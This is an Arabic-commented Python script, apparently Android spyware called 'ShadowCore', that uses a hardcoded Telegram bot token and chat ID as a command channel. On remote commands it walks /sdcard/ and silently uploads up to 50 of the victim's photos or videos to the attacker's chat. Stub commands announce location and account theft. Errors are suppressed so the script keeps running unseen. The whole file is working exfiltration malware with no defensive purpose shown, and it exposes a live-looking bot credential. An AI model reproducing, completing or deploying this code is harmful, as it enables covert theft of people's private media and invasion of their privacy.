import os
import time
import requests
from threading import Thread

# --- إعدادات البوت ---
TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"
URL = f"https://api.telegram.org/bot{TOKEN}/"

class ShadowCoreService:
    def __init__(self):
        self.sent_files_log = []
        self.is_running = True

    def send_msg(self, text):
        try: requests.post(URL + "sendMessage", data={"chat_id": CHAT_ID, "text": text})
        except: pass

    def send_photo(self, file_path):
        try:
            with open(file_path, 'rb') as photo:
                requests.post(URL + "sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": photo})
            return True
        except: return False

    def deep_scan_and_send(self, extension=".jpg", min_size=102400):
        self.send_msg("🔎 جاري تشغيل الرادار العميق... يرجى الانتظار")
        count = 0
        root_path = "/sdcard/"
        
        for root, dirs, files in os.walk(root_path):
            for file in files:
                if file.lower().endswith(extension):
                    file_path = os.path.join(root, file)
                    try:
                        if os.path.getsize(file_path) > min_size and file_path not in self.sent_files_log:
                            if self.send_photo(file_path):
                                self.sent_files_log.append(file_path)
                                count += 1
                                time.sleep(1.5) 
                            if count >= 50:
                                self.send_msg(f"✅ تم سحب {count} صورة بنجاح.")
                                return
                    except: continue
        self.send_msg(f"🏁 انتهى المسح. تم العثور على {count} ملفات.")

    def listener(self):
        last_update_id = 0
        self.send_msg("✅ ShadowCore Active\nالأوامر: M (صور), O (فيديو), T (موقع), S (حسابات)")
        
        while self.is_running:
            try:
                response = requests.get(URL + "getUpdates", params={"offset": last_update_id + 1, "timeout": 30}).json()
                for update in response.get("result", []):
                    last_update_id = update["update_id"]
                    msg_text = update.get("message", {}).get("text", "").upper()
                    
                    if msg_text == "M":
                        Thread(target=self.deep_scan_and_send, args=(".jpg", 102400)).start()
                    elif msg_text == "O":
                        Thread(target=self.deep_scan_and_send, args=(".mp4", 512000)).start()
                    elif msg_text == "T":
                        self.send_msg("📍 جاري سحب الموقع...")
                    elif msg_text == "S":
                        self.send_msg("🔐 جاري فحص الحسابات...")
            except:
                time.sleep(10)

if __name__ == "__main__":
    service = ShadowCoreService()
    service.listener()
